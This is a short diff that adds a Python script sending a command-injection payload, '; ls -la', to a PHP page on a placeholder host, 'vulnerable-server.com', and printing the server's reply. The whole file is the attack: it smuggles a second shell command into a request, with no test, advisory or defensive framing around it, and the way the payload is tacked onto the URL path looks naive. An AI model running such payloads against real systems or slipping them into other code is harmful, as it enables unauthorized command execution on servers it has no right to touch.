@@ -1,0 +1,9 @@
+import requests
+
+url = "http://vulnerable-server.com/command.php"
+
+payload = "; ls -la"
+
+response = requests.get(url + payload)
+
+print(response.text)
